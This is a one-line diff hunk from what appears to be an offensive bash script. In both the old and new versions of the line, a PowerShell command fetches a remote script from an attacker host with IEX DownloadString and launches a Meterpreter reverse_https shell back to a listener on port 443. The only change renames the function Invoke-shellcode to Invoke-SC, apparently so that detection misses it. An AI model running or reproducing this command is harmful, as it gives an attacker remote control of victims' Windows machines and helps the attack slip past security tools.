@@ -393,7 +393,7 @@ while true; do
                if [ $try != 5 ]; then
                    get_lhost
                    get_targets
-                   lzr=$(echo "cmd.exe /c echo . | powershell.exe ""IEX ((New-Object System.Net.WebClient).DownloadString('http://"$host"/pld3')); Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost "$lhst" -Lport 443 -Force""")
+                   lzr=$(echo "cmd.exe /c echo . | powershell.exe ""IEX ((New-Object System.Net.WebClient).DownloadString('http://"$host"/pld3')); Invoke-SC -Payload windows/meterpreter/reverse_https -Lhost "$lhst" -Lport 443 -Force""")
                    fire_lzr
                fi
                ;;
